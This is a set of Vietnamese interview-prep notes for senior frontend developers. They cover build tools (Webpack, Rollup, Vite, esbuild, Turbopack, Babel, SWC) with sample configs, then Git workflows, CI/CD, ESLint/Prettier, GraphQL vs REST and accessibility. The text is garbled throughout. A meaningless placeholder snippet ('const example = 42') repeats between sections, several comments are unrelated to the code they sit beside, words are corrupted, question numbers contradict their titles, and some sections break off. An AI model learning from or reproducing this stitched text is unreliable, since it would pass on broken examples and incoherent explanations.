 // Chú giải: 3. Throttle UI updates với requestAnimationFrame
const latestData = useRef({});
const updateUI = () => {
  setData(latestData.current);
  rafId = requestAnimationFrame(updateUI);
};

 // Chú giải: 4. Handle reconnection với exponential backoff
const delay = baseDelay * Math.pow(2, attempts);

 // Chú giải: 5. Show connection status to users
<ConnectionStatus status={wsStatus} />

 // Chú giải: 6. Batch updates
let batch = [];
const flushBatch = () => {
  updateStore(batch);
  batch = [];
};
setTimeout(flushBatch, 16); // Chú giải: 60fps

 // Chú giải: 7. Use virtual scrolling for large lists
<AgGridReact rowData={data} /> // Chú giải: Auto virtual scrolling

/**
 * ❌ DON'T:
 */

 // Chú giải: 1. Don't create multiple WebSocket connections for same data
 // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.

 // Chú giải: 2. Don't update UI on every message
 // Chú giải: Throttle với RAF!

 // Chú giải: 3. Don't forget to unsubscribe
 // Chú giải: Memory leak!

 // Chú giải: 4. Don't render all items in large lists
 // Chú giải: Use virtual scrolling!

 // Chú giải: 5. Don't ignore close codes
 // Chú giải: Check if should reconnect!

 // Chú giải: 6. Don't use == for subscription checking
 // Chú giải: Use Set or Map!

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────────────────┐
│                    BUILD TOOLS LANDSCAPE 2024                        │
│                 (Bản Đồ Công Cụ Build Năm 2024)                     │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  🏗️ BUNDLERS (Module Bundling - Đóng Gói Module)                    │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │  • Webpack     - Lâu đời nhất, config phức tạp (2012)         │ │
│  │                  Như ông già giàu kinh nghiệm                  │ │
│  │  • Rollup      - Chuyên về ESM, tree-shaking tốt nhất (2015)  │ │
│  │                  Như chuyên gia dọn rác code                   │ │
│  │  • Vite        - Hiện đại, dev server siêu nhanh (2020)       │ │
│  │                  Như xe đua F1                                  │ │
│  │  • Turbopack   - Viết bằng Rust, tích hợp Next.js (2022)      │ │
│  │                  Như tên lửa SpaceX                             │ │
│  │  • esbuild     - Tốc độ khủng, viết bằng Go (2020)            │ │
│  │                  Như máy bay siêu thanh                         │ │
│  └────────────────────────────────────────────────────────────────┘ │
│                                                                      │
│  ⚙️ TRANSPILERS (Code Transformation - Chuyển Đổi Code)             │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │  • Babel       - Tương thích tốt nhất, nhiều plugin (2014)    │ │
│  │                  Như thông dịch viên chuyên nghiệp             │ │
│  │  • SWC         - Viết bằng Rust, nhanh gấp 20x Babel (2020)   │ │
│  │                  Như thông dịch viên AI siêu tốc               │ │
│  └────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

javascript
 // Chú giải: webpack.config.js
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');

module.exports = {
  mode: 'production', // Chế độ: 'development' hoặc 'production'
  entry: './src/index.tsx', // File đầu vào (entry point)

  output: {
    path: path.resolve(__dirname, 'dist'), // Chú giải: Thư mục output
    filename: '[name].[contenthash].js', // Tên file output với hash (cache busting)
    clean: true, // Xóa thư mục dist cũ trước khi build
  },

  // LOADERS - Xử lý các loại file khác nhau
  module: {
    rules: [
      // Rule 1: Xử lý TypeScript/TSX
      {
        test: /\.(ts|tsx)$/, // Regex: file nào match .ts hoặc .tsx
        use: 'babel-loader', // Dùng babel-loader để transpile
        exclude: /node_modules/, // Bỏ qua node_modules (không cần transpile)
      },
      // Rule 2: Xử lý CSS
      {
        test: /\.css$/, // Chú giải: File .css
        use: [MiniCssExtractPlugin.loader, 'css-loader'], // Extract CSS ra file riêng
        // Chạy từ phải → trái: css-loader → MiniCssExtractPlugin.loader
      },
      // Rule 3: Xử lý Images
      {
        test: /\.(png|svg|jpg|jpeg|gif)$/i, // Chú giải: File ảnh
        type: 'asset/resource', // Copy ảnh vào dist, return URL
      },
    ],
  },

  // PLUGINS - Mở rộng chức năng Webpack
  plugins: [
    // Plugin 1: Tạo HTML file tự động
    new HtmlWebpackPlugin({
      template: './public/index.html', // Chú giải: Template HTML
      // Tự động inject <script> tag vào HTML
    }),
    // Plugin 2: Extract CSS ra file riêng
    new MiniCssExtractPlugin({
      filename: '[name].[contenthash].css', // Tên file CSS với hash
    }),
  ],

  // OPTIMIZATION - Tối ưu hóa bundle
  optimization: {
    splitChunks: {
      chunks: 'all', // Chú giải: Chia nhỏ tất cả chunks
      cacheGroups: {
        // Tạo vendor bundle riêng cho node_modules
        vendor: {
          test: /[\\/]node_modules[\\/]/, // Chú giải: Match node_modules
          name: 'vendors', // Tên chunk: vendors.js
          priority: 10, // Ưu tiên cao hơn (chạy trước)
        },
 // Chú giải: Result: app.js (code của bạn) + vendors.js (node_modules)
      },
    },
  },

  // RESOLVE - Cấu hình cách resolve modules
  resolve: {
    extensions: ['.tsx', '.ts', '.js'], // Auto-resolve các extension này
    // import './App' → tự tìm App.tsx, App.ts, App.js
  },
};

```js
// Ví dụ rút gọn
const example = 42;
```

Dev Server Start:  ~10 giây (cold start - lần đầu chạy)
- Bundle toàn bộ app trước
- Parse 1000+ files
- Transform với Babel

HMR:               ~1-2 giây (sau khi sửa code)
- Re-bundle phần thay đổi
- Inject vào browser

Production Build:  ~10-30 giây (tuỳ kích thước app)
- Minify, optimize, tree-shake
- Generate source maps

```js
// Ví dụ rút gọn
const example = 42;
```

javascript
 // Chú giải: rollup.config.js
import { defineConfig } from 'rollup';
import typescript from '@rollup/plugin-typescript';
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import terser from '@rollup/plugin-terser';

export default defineConfig({
  input: 'src/index.ts', // File đầu vào

  // OUTPUT - Xuất ra nhiều formats
  output: [
 // Chú giải: Format 1: CommonJS - cho Node.js
    {
      file: 'dist/bundle.cjs.js', // Chú giải: File output
      format: 'cjs', // Chú giải: CommonJS: require/module.exports
      sourcemap: true, // Chú giải: Tạo source map cho debugging
    },
    // Format 2: ESM - cho browsers hiện đại
    {
      file: 'dist/bundle.esm.js',
      format: 'esm', // Chú giải: ES Modules: import/export
      sourcemap: true,
    },
 // Chú giải: Format 3: UMD - universal (browser + Node)
    {
      file: 'dist/bundle.umd.js',
      format: 'umd', // Chú giải: UMD: chạy mọi nơi
      name: 'MyLibrary', // Tên global variable trong browser
      sourcemap: true,
 // Chú giải: Usage: <script src="bundle.umd.js"></script>
 // Chú giải: window.MyLibrary.someFunction()
    },
  ],

  // PLUGINS - Mở rộng chức năng
  plugins: [
    resolve(), // Chú giải: Resolve node_modules
               // Tìm dependencies trong node_modules

    commonjs(), // Chú giải: Convert CJS → ESM
                // Vì Rollup chỉ hiểu ESM, phải convert CJS packages

    typescript({ // Chú giải: Compile TypeScript
      tsconfig: './tsconfig.json',
 // Chú giải: Transpile .ts/.tsx → .js
    }),

    terser(), // Chú giải: Minify code
              // Nén code: xóa whitespace, rename variables
 // Chú giải: bundle.js (100KB) → bundle.min.js (30KB)
  ],

  // EXTERNAL - Không bundle dependencies này
  external: ['react', 'react-dom'], // Chú giải: Peer dependencies
  // Lý do: Library sẽ dùng React của app consumer
  // Không nên bundle React vào library → tăng size, conflict version
});

```js
// Ví dụ rút gọn
const example = 42;
```

Production Build:  ~5 giây
- Nhanh hơn Webpack (~10-30s)
- Tree-shake hiệu quả

Bundle Size:       -30% nhỏ hơn Webpack
- Ít runtime code
- Tree-shaking tốt hơn

Example:
  Webpack: 150KB (minified)
  Rollup:  105KB (minified) ← Nhỏ hơn 30%

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],

  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },

  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
        },
      },
    },
  },

  server: {
    port: 3000,
    open: true,
  },
});

```js
// Ví dụ rút gọn
const example = 42;
```

Dev Server Start:  ~500ms ⚡ (instant!)
HMR:               ~50ms ⚡
Production Build:  ~2-5 seconds (Rollup)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: TRADITIONAL BUNDLER (Webpack)
┌────────────────────────────────────────┐
│ 1. Bundle ALL code                     │
│    ├─ node_modules (5MB)               │
│    ├─ src (1MB)                        │
│    └─ Transform, minify, bundle        │
│    ↓ 10 seconds                        │
│ 2. Start dev server                    │
│ 3. Serve bundle                        │
└────────────────────────────────────────┘

 // Chú giải: VITE (ESM-based)
┌────────────────────────────────────────┐
│ 1. Start dev server IMMEDIATELY ⚡      │
│    ↓ 500ms                             │
│ 2. Browser requests /src/App.tsx       │
│ 3. Transform ONLY requested file       │
│    ↓ 50ms                              │
│ 4. Serve ESM module                    │
│                                        │
│ ✅ Pre-bundle node_modules (esbuild)   │
│ ✅ Transform on-demand (lazy)          │
│ ✅ Native ESM (no bundling in dev)     │
└────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: esbuild.config.js
const esbuild = require('esbuild');

esbuild.build({
  entryPoints: ['src/index.tsx'],
  bundle: true,
  outfile: 'dist/bundle.js',
  minify: true,
  sourcemap: true,
  target: ['es2020'],
  loader: {
    '.ts': 'ts',
    '.tsx': 'tsx',
  },
  external: ['react', 'react-dom'],
}).catch(() => process.exit(1));

```js
// Ví dụ rút gọn
const example = 42;
```

Production Build:  ~500ms ⚡⚡⚡ (10x faster than Webpack!)
Bundle Size:       Similar to Rollup

```js
// Ví dụ rút gọn
const example = 42;
```

javascript
 // Chú giải: next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  experimental: {
    turbo: {
 // Chú giải: Enable Turbopack
      loaders: {
        '.svg': ['@svgr/webpack'],
      },
    },
  },
};

module.exports = nextConfig;

```js
// Ví dụ rút gọn
const example = 42;
```

Dev Server (Next.js):
- Webpack:  ~10 seconds
- Turbopack: ~1 second ⚡⚡⚡ (10x faster!)

HMR:
- Webpack:  ~1-2 seconds
- Turbopack: ~50ms ⚡⚡⚡

```js
// Ví dụ rút gọn
const example = 42;
```

javascript
 // Chú giải: babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      targets: '> 0.25%, not dead',
      useBuiltIns: 'usage',
      corejs: 3,
    }],
    '@babel/preset-react',
    '@babel/preset-typescript',
  ],
  plugins: [
    '@babel/plugin-proposal-class-properties',
    '@babel/plugin-proposal-optional-chaining',
  ],
};

```js
// Ví dụ rút gọn
const example = 42;
```

json
 // Chú giải: .swcrc
{
  "jsc": {
    "parser": {
      "syntax": "typescript",
      "tsx": true
    },
    "transform": {
      "react": {
        "runtime": "automatic"
      }
    },
    "target": "es2020"
  },
  "module": {
    "type": "es6"
  },
  "minify": true
}

```js
// Ví dụ rút gọn
const example = 42;
```

Transpile 1000 files:
- Babel: ~10 seconds
- SWC:   ~500ms ⚡⚡⚡ (20x faster!)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: =====================================
 // Chú giải: BUILD TOOL SELECTION GUIDE
 // Chú giải: =====================================

const selectBuildTool = (project: Project): BuildTool => {
 // Chú giải: 1. NEW PROJECT → Vite
  if (project.isNew && project.framework !== 'Next.js') {
    return 'Vite'; // Chú giải: ⚡ Best DX, fast, modern
  }

 // Chú giải: 2. NEXT.JS → Turbopack (experimental)
  if (project.framework === 'Next.js') {
    return 'Turbopack'; // Chú giải: 🚀 Native, fastest
  }

 // Chú giải: 3. LIBRARY → Rollup
  if (project.type === 'library') {
    return 'Rollup'; // Chú giải: 📦 Best tree-shaking, multiple outputs
  }

 // Chú giải: 4. LEGACY/ENTERPRISE → Webpack
  if (project.hasLegacyCode || project.complexRequirements) {
    return 'Webpack'; // Chú giải: 🏗️ Mature, configurable, plugins
  }

 // Chú giải: 5. CI/CD BUILD ONLY → esbuild
  if (project.needsSpeed && !project.needsDevServer) {
    return 'esbuild'; // Chú giải: ⚡⚡⚡ Fastest builds
  }

 // Chú giải: Default: Vite
  return 'Vite';
};

 // Chú giải: TRANSPILER SELECTION
const selectTranspiler = (project: Project): Transpiler => {
 // Chú giải: 1. SPEED CRITICAL → SWC
  if (project.prioritizeSpeed) {
    return 'SWC'; // Chú giải: ⚡ 20x faster
  }

 // Chú giải: 2. OLD BROWSER SUPPORT → Babel
  if (project.targets.includes('IE11')) {
    return 'Babel'; // Chú giải: 🌐 Best compatibility
  }

 // Chú giải: 3. COMPLEX TRANSFORMATIONS → Babel
  if (project.needsCustomPlugins) {
    return 'Babel'; // Chú giải: 🔌 Huge ecosystem
  }

 // Chú giải: Default: SWC (modern projects)
  return 'SWC';
};

```js
// Ví dụ rút gọn
const example = 42;
```

Project: React app (500 components, 2MB source)

DEV SERVER START:
┌──────────────┬───────────┬──────────────┐
│ Tool         │ Time      │ Comparison   │
├──────────────┼───────────┼──────────────┤
│ Webpack      │ 10s       │ Baseline     │
│ Rollup       │ 8s        │ 1.25x faster │
│ Vite         │ 500ms     │ 20x faster ⚡│
│ esbuild      │ 300ms     │ 33x faster ⚡│
│ Turbopack    │ 1s        │ 10x faster ⚡│
└──────────────┴───────────┴──────────────┘

PRODUCTION BUILD:
┌──────────────┬───────────┬──────────────┐
│ Tool         │ Time      │ Bundle Size  │
├──────────────┼───────────┼──────────────┤
│ Webpack      │ 30s       │ 500KB        │
│ Rollup       │ 15s       │ 450KB ✅      │
│ Vite         │ 10s       │ 460KB        │
│ esbuild      │ 2s ⚡      │ 470KB        │
│ Turbopack    │ 5s        │ 460KB        │
└──────────────┴───────────┴──────────────┘

HMR (Hot Module Replacement):
┌──────────────┬───────────┐
│ Tool         │ Update    │
├──────────────┼───────────┤
│ Webpack      │ 1-2s      │
│ Vite         │ 50ms ⚡    │
│ Turbopack    │ 50ms ⚡    │
└──────────────┴───────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. Install Vite
npm install vite @vitejs/plugin-react

 // Chú giải: 2. Create vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

 // Chú giải: Migrate Webpack aliases
  resolve: {
    alias: {
      '@': '/src',
    },
  },

 // Chú giải: Migrate Webpack env vars
  define: {
    'process.env': {},
  },
});

 // Chú giải: 3. Update index.html
 // Chú giải: Move from public/ to root
 // Chú giải: Change <script src="/src/index.tsx" type="module">

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  }
}

 // Chú giải: 5. Replace Webpack-specific code
 // Chú giải: - require() → import
 // Chú giải: - require.context() → import.meta.glob()
 // Chú giải: - process.env → import.meta.env

```js
// Ví dụ rút gọn
const example = 42;
```

bash
---

## 49. Q49: 🌿 Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution

### P1: Tên câu hỏi: 🌿 Q47: Git Workflow & Team Collaboration - Branching Strategy, Merge vs Rebase, Conflict Resolution

### P2: Trả lời (Senior):

## 50. Q50: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"Git workflow tốt = ít conflicts + dễ review + dễ rollback. Git Flow cho dự án lớn, GitHub Flow cho CI/CD. Rebase tạo clean history, Merge giữ context. Feature flags deploy code chưa xong mà không ảnh hưởng production."**

**🔑 2 Branching Strategies:**

**1. Git Flow (Dự án lớn, release theo version):**
- **Branches**: `main` (production) + `develop` (staging) + `feature/*` + `release/*` + `hotfix/*`
- **Flow**: feature → develop → release → main
- **Hotfix**: main → hotfix → main + develop (fix bug khNeedstoẩn cấp)
- Use case: Enterprise apps, mobile apps (v1.0, v2.0 releases)

**2. GitHub Flow (CI/CD, deploy liên tục):**
- **Branches**: `main` (luôn deployable) + `feature/*`
- **Flow**: feature → PR → review → merge main → auto deploy
- **Simple**: Chỉ 2 loại branches, deploy mỗi merge
- Use case: SaaS apps, web apps với frequent deployments

**🔑 Merge vs Rebase:**

| **Aspect** | **Merge** | **Rebase** |
|-----------|----------|----------|
| **History** | Giữ nguyên (merge commits) | Sạch (linear) |
| **Context** | Giữ timeline thực | Mất timeline |
| **Conflicts** | 1 lần resolve | Nhiều lần (mỗi commit) |
| **Use case** | Public branches (main, develop) | Private feature branches |

**Golden Rule**: **NEVER rebase public branches** (main, develop) - chỉ rebase local/feature branches

**⚠️ Lỗi Thường Gặp:**
- Rebase shared branch → force push → team mất commits
- Không pull trước merge → conflicts
- Commit trực tiếp vào main/develop → bypass reviews
- Large PRs (>500 lines) → khó review, dùng feature flags thay vì

**💡 Kiến Thức Senior:**
- **Feature Flags**: Deploy code chưa xong nhưng tắt feature, bật dần (LaunchDarkly, Unleash)
- **Trunk-Based Development**: Mọi người commit vào main, feature flags control releases
- **Conventional Commits**: `feat:`, `fix:`, `docs:` - auto-generate changelogs
- **Git bisect**: Binary search tìm commit gây bug (tự động test mỗi commit)
- **Squash merge**: Combine feature commits thành 1 commit khi merge (clean main history)

**⚡ Quick Summary:**
> Git workflow tốt = ít conflict + dễ review + dễ rollback. Git Flow phù hợp dự án lớn, GitHub Flow phù hợp CI/CD. Rebase tạo history sạch, Merge giữ nguyên context. Feature flags giúp deploy code chưa hoàn thiện mà không ảnh hưởng production.

**💡 Ghi Nhớ:**
- 🌳 **Git Flow**: main + develop + feature/* + release/* + hotfix/* (dự án lớn, release theo version)
- 🚀 **GitHub Flow**: main + feature/* (CI/CD, deploy liên tục)
- ⚔️ **Merge vs Rebase**: Merge = giữ nguyên history, Rebase = history sạch nhưng mất context
- 🚩 **Feature Flags**: Deploy code mới nhưng tắt feature, bật dần theo phần trăm user

---

### **1. Branching Models - Các Mô Hình Phân Nhánh**

#### **1.1. Git Flow - Mô hình phổ biến cho dự án lớn**

```js
// Ví dụ rút gọn
const example = 42;
```

**Chi tiết các nhánh:**

```js
// Ví dụ rút gọn
const example = 42;
```

        ╭─────╮
       ╱ E2E  ╲     10% - Chậm, expensive, critical paths only
      ╭───────╮
     ╱ Integr. ╲   30% - Component + API integration
    ╭─────────╮
   ╱   Unit    ╲  60% - Fast, pure functions, business logic
  ╰───────────╯

```js
// Ví dụ rút gọn
const example = 42;
```

javascript
 // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
performance.mark('checkout-start');
 // Chú giải: ... logic
performance.mark('checkout-end');
performance.measure('checkout', 'checkout-start', 'checkout-end');
const measure = performance.getEntriesByName('checkout')[0];
 // Chú giải: Send to APM: Sentry, DataDog

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
     return obj[key]; // Chú giải: Type-safe property access
   }
   const user = { name: 'Alice', age: 30 };
   getProperty(user, 'name'); // Chú giải: Type: string

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type User = { id: number; name: string; email: string };
   type PartialUser = Partial<User>; // Chú giải: All optional
   type UserName = Pick<User, 'id' | 'name'>; // Chú giải: Only id, name
   type NoEmail = Omit<User, 'email'>; // Chú giải: Exclude email

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type Readonly<T> = { readonly [K in keyof T]: T[K] };
   type Optional<T> = { [K in keyof T]?: T[K] };

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type IsString<T> = T extends string ? true : false;
   type A = IsString<string>; // Chú giải: true
   type B = IsString<number>; // Chú giải: false

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type EventName<T extends string> = `on${Capitalize<T>}`;
   type ClickEvent = EventName<'click'>; // Chú giải: "onClick"

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   function isString(value: unknown): value is string {
     return typeof value === 'string';
   }
   if (isString(value)) {
     value.toUpperCase(); // Chú giải: TS knows value is string
   }

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type State =
     | { status: 'loading' }
     | { status: 'success'; data: string }
     | { status: 'error'; error: Error };

   function handle(state: State) {
     switch (state.status) {
       case 'loading': return 'Loading...';
       case 'success': return state.data; // Chú giải: TS knows data exists
       case 'error': return state.error.message;
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type ApiResponse<T> =
     | { success: true; data: T }
     | { success: false; error: string };

   async function fetchUser(): Promise<ApiResponse<User>> {
 // Chú giải: ...
   }

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type FormState<T> = {
     values: T;
     errors: Partial<Record<keyof T, string>>;
     touched: Partial<Record<keyof T, boolean>>;
   };

```js
// Ví dụ rút gọn
const example = 42;
```

ts
   type UserId = string & { __brand: 'UserId' };
   type ProductId = string & { __brand: 'ProductId' };

   function getUser(id: UserId) { /*...*/ }
   const userId = '123' as UserId;
   getUser(userId); // Chú giải: OK
 // Chú giải: getUser('456'); // Error: string not assignable to UserId

```js
// Ví dụ rút gọn
const example = 42;
```

ts
  type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

```js
// Ví dụ rút gọn
const example = 42;
```

ts
  const colors = ['red', 'blue'] as const; // Chú giải: Type: readonly ["red", "blue"]
  ```
- **tsconfig strict mode**: Enable all strict checks (`strict: true`) → catch bugs early.
- **Declaration files**: `.d.ts` for third-party libraries không có types.

---

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)
> **Thời gian trả lời:** 15-20 phút

---
---

## 51. Q51: 🚀 Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation

### P1: Tên câu hỏi: 🚀 Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation

### P2: Trả lời (Senior):

## 52. Q52: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"CI/CD pipeline tự động hóa: Code quality (lint, test) → Build → Deploy. GitHub Actions: workflows YAML, matrix builds, caching. Deploy strategies: Blue-Green, Canary, Rolling. Secrets: GitHub Secrets + env variables."**

**🔑 CI/CD Stages:**

**1. Code Quality (on PR):**
- ESLint + Prettier check (formatting)
- TypeScript type check
- Unit tests (Jest/Vitest)
- Integration tests (React Testing Library)
- Bundle size check (fail if > budget)

**2. Build (on merge):**
- Install dependencies (npm ci với cache)
- Build production bundle (`npm run build`)
- Generate source maps
- Upload artifacts (S3, CDN)

**3. Deploy:**
- **Staging**: Auto-deploy on develop branch
- **Production**: Auto-deploy on main (or manual approval)
- Deployment strategies: Blue-Green, Canary, Rolling
- Health checks + smoke tests

**4. Post-Deploy:**
- Lighthouse CI (performance check)
- Sentry release tracking
- Slack/Discord notifications
- Rollback on failure

**🔑 GitHub Actions Best Practices:**

- **Matrix builds**: Test nhiều Node versions (18, 20, 22)
- **Caching**: `actions/cache` cho node_modules - save 2-5 phiMút
- **Secrets**: `${{ secrets.API_KEY }}` - không hardcode
- **Conditional runs**: `if: github.event_name == 'push'`
- **Reusable workflows**: Share common workflows

**⚠️ Lỗi Thường Gặp:**
- Không cache dependencies → mỗi build install lại (chậm)
- Hardcode secrets trong code → security risk
- Deploy thẳng production → không rollback, dùng Blue-Green
- Không test staging → bugs in production

**💡 Kiến Thức Senior:**
- **Docker multi-stage builds**: Build image nhỏ (Alpine base, remove dev deps)
- **Vercel/Netlify**: Zero-config CI/CD (auto-detect framework)
- **Deployment slots** (Azure): Test production environment trước swap
- **Feature flags**: Deploy code OFF, bật dần (LaunchDarkly)

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)
> **Thời gian trả lời:** 15-20 phút

---
---

## 53. Q53: 📏 Q54: Code Quality & Standards - ESLint, Prettier, Code Review

### P1: Tên câu hỏi: 📏 Q54: Code Quality & Standards - ESLint, Prettier, Code Review

### P2: Trả lời (Senior):

## 54. Q54: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Code quality tools: ESLint (bugs + patterns), Prettier (formatting), Husky (pre-commit hooks), Commitlint (conventional commits). Code review: Small PRs, clear descriptions, constructive feedback, automated checks."**

**🔑 Tooling Stack:**

**1. ESLint - Linting:**
- **Find bugs**: unused vars, missing deps, type errors
- **Enforce patterns**: no-console, prefer-const, React hooks rules
- **Plugins**: @typescript-eslint, eslint-plugin-react, jsx-a11y
- **Config**: Extend airbnb/standard, customize rules

**2. Prettier - Formatting:**
- **Auto-format**: spacing, quotes, semicolons, line breaks
- **Config**: `.prettierrc` - printWidth, singleQuote, trailingComma
- **Integration**: ESLint plugin (eslint-plugin-prettier)
- **IDE**: Format on save (VSCode, WebStorm)

**3. Husky - Git Hooks:**
- **Pre-commit**: Run lint + format trước commit
- **Pre-push**: Run tests trước push
- **Commit-msg**: Validate commit message format
- **Setup**: `npx husky-init && npm install`

**4. Commitlint - Conventional Commits:**
- **Format**: `type(scope): subject` - `feat(auth): add login`
- **Types**: feat, fix, docs, style, refactor, test, chore
- **Benefits**: Auto-generate changelogs, semantic versioning

**🔑 Code Review Best Practices:**

- **Small PRs**: < 400 lines - dễ review, ít bugs
- **Clear descriptions**: What/Why/How, screenshots, testing steps
- **Automated checks**: Lint, tests, bundle size pass trước review
- **Constructive feedback**: Suggest alternatives, explain WHY
- **Timely reviews**: < 24 hours response time

**⚠️ Lỗi Thường Gặp:**
- ESLint warnings ignored → accumulate technical debt
- Không Prettier → inconsistent formatting, merge conflicts
- Large PRs (>1000 lines) → rubber-stamp reviews
- Blame culture in reviews → team morale giảm

**💡 Kiến Thức Senior:**
- **SonarQube**: Code quality metrics (bugs, vulnerabilities, code smells)
- **Bundle analysis**: webpack-bundle-analyzer - visualize bundle size
- **Lighthouse CI**: Performance budgets trong CI/CD
- **Danger.js**: Automate code review comments (big PRs warning, missing tests)

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
> **Thời gian trả lời:** 12-15 phút

---
---

## 55. Q55: 🔄 Q55: GraphQL vs REST - API Design, Apollo Client

### P1: Tên câu hỏi: 🔄 Q55: GraphQL vs REST - API Design, Apollo Client

### P2: Trả lời (Senior):

## 56. Q56: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"GraphQL = single endpoint, client-driven queries, exact data (no over/under-fetching). REST = multiple endpoints, server-driven. Apollo Client: caching, optimistic updates, subscriptions. GraphQL tốt cho complex data, REST tốt cho simple CRUD."**

**🔑 GraphQL vs REST:**

| **Aspect** | **REST** | **GraphQL** |
|-----------|---------|------------|
| **Endpoints** | Multiple (`/users`, `/posts`) | Single (`/graphql`) |
| **Data fetching** | Server decides | **Client decides** |
| **Over-fetching** | ✅ Common | ❌ Exact fields |
| **Under-fetching** | ✅ Multiple requests | ❌ Single request |
| **Versioning** | `/v1`, `/v2` | **No versions** (deprecate fields) |
| **Caching** | HTTP cache (simple) | Custom (Apollo cache) |

**🔑 Apollo Client Features:**

**1. Caching:**
- **Normalized cache**: Store objects by ID, auto-dedupe
- **Cache policies**: cache-first, network-only, cache-and-network
- **Auto-update**: Mutations auto-update affected queries

**2. Queries & Mutations:**
- **useQuery**: Fetch data + loading/error states
- **useMutation**: Modify data + optimistic updates
- **Fragments**: Reusable field selections

**3. Subscriptions (Real-time):**
- WebSocket connection cho real-time updates
- Use case: Chat, notifications, live data

**4. Optimistic Updates:**
- Update UI immediately (assume success)
- Rollback if mutation fails

**⚠️ Lỗi Thường Gặp:**
- N+1 queries → backend performance issue (dùng DataLoader)
- Không hiểu cache → redundant network requests
- Over-complicated queries → chậm backend, split queries
- Public GraphQL endpoint không rate limit → DoS risk

**💡 Kiến Thức Senior:**
- **Persisted queries**: Pre-register queries (security + performance)
- **Automatic Persisted Queries** (APQ): Hash queries → reduce bandwidth
- **Federation**: Microservices architecture cho GraphQL
- **Batching**: Combine multiple queries in 1 HTTP request

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
> **Thời gian trả lời:** 12-15 phút

---
---

## 57. Q57: ♿ Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers

### P1: Tên câu hỏi: ♿ Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers

### P2: Trả lời (Senior):

## 58. Q58: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"A11y đảm bảo mọi người dùng được web. WCAG 2.1 levels: A (minimum), AA (legal requirement), AAA (ideal). ARIA: roles, states, properties. Keyboard nav, color contrast, screen reader support. Tools: axe, Lighthouse."**

**🔑 WCAG 2.1 Compliance:**

**Level AA (Recommended - legal trong nhiều nước):**
- **Color contrast**: ≥ 4.5:1 (text), ≥ 3:1 (large text 18pt+)
- **Keyboard accessible**: All functionality với keyboard (no mouse-only)
- **Alt text**: Tất cả images có alt (decorative = alt="")
- **Form labels**: `<label>` cho mọi `<input>`
- **Touch targets**: ≥ 44×44px (mobile)
- **Focus indicators**: Rõ ràng khi tab (không `outline: none`)

**🔑 ARIA Attributes:**

**1. Roles:**
- `role="button"` - custom button (div click → button semantics)
- `role="navigation"`, `role="main"`, `role="complementary"`
- **Rule**: Dùng semantic HTML trước (`<button>` > `<div role="button">`)

**2. States:**
